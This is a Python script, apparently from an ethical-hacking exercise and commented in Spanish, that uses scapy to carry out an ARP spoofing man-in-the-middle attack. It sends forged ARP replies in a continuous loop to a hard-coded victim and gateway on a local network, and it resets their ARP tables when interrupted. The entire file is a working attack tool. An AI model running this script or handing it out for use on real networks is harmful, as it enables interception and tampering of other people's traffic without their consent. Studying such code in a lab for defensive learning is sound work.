import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)# Aqui creamos la solicitud de preguntar quien tiene esa direcciion el cual le damos como parametro un rango de ip's
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")#Aqui fijamos nuestro mac 
    #print(broadcast.summary())
    arp_request_broadcast = broadcast/arp_request#combinanos los dos paquetes dentro de un paquete
    #print(arp_request_broadcast.summary())
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]#Verbose no muestra tan detallado, en otras palabras nos quita el begin y los datos que fueron mandado,timeout es un tiempo de espera Ã¡sicamente, cuando establecemos un tiempo de espera, estamos diciendo que espere esta cantidad de segundos. Si no obtiene ninguna respuesta, continÃºe, no siga esperando.
    #print(answered_list[0][1].hwsrc)
    return answered_list[0][1].hwsrc   

def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    #Entonces, lo que estamos haciendo en esta linea en particular, es basicamente enviando un paquete a la victima diciendo tengo la direccion mac del enrutador en otras palabras haciendoce pasar por el router
    #Creamos en esta linea el ARP response
    packet=scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)#op=2 es para un ARP response op=1 para un ARP request, pdst="ip de la victicma",hwdst="mac de la victicma",psrc="ip del router"
    #print(packet.show())#aqui vemos el hwsrc= 'a la mac nuestra maquina hacker, mostrando que nos estamos haciendo pasar por el router'
    #print(packet.summary())
    #Enviamos el ARP response
    scapy.send(packet, verbose=False)#verbose=false para no ver tan detallado el envio de paquetes.

def restore(destination_ip, source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    #print(packet.show())
    #print(packet.summary())

target_ip="192.168.88.253"
gateway_ip="192.168.88.1"

try:
    sent_packets_count=0
    while True:
        #Entonces les decimos a las vi­ctima que somos el enrutador
        spoof(target_ip,gateway_ip)#Ip victima, Ip router
        # le decimos al enrutador que somos la victima
        spoof(gateway_ip,target_ip)#Ip router, Ip victima
        sent_packets_count=sent_packets_count+2
        print("\r [+] packet sent: " + str(sent_packets_count), end='')#Limpiamos buffer y mostramos lo ultimo del ciclo while
        time.sleep(2)
except:
    print("\n [-] Detectamos CTRL+C.. Resetiando ARP Tables.. please wait.\n")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)


